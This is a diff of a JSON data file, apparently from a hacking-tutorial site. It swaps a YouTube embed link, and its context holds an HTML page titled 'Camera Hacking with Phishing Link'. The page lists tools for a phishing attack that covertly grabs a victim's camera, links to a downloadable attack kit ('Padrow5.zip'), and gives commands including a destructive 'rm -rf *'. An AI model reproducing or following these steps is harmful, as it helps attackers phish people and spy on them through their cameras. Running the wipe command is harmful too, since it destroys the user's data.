@@ -7,7 +7,7 @@
     },
     {
     "2" : [
-        "https://www.youtube.com/embed/hsZf-I7O3c0?si=kxiYxCvOK1YNOWcB",
+        "https://www.youtube.com/embed/EpDqGvz3Fw4?si=8DzXncZs35W_klBl",
         "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Camera Hacking with Phishing Link</title><style>body{font-family:Arial,sans-serif;background-color:#f4f4f4;color:#333;margin:0;padding:20px;width:100%;} .container{width:100%;max-width:800px;margin:0 auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);} .commands{background:#333;color:#fff;padding:20px;border-radius:8px;margin-top:20px;} .commands pre{background:#222;padding:10px;border-radius:4px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;} h1{color:#444;text-align:center;} ul{list-style-type:none;padding:0;} ul li{background:#eee;margin:10px 0;padding:10px;border-radius:4px;}</style></head><body><div class='container'><h1>Camera Hacking with Phishing Link</h1><h2>Requirements</h2><ul><li>replit.com</li><li>Telegram</li><li>Padrwo.zip (<a href='https://hackersnexus.github.io/website/files/Padrow5.zip'>Download</a>)</li><li>Google files</li><li>Termux (<a href='https://f-droid.org/repo/com.termux_118.apk'>Download</a>)</li><li>Python, Flask, Telebot</li></ul><div class='commands'><h2>Commands</h2><pre>rm -rf *<br>unzip Padrow5.zip</pre></div></div></body></html>"
 
     ]}
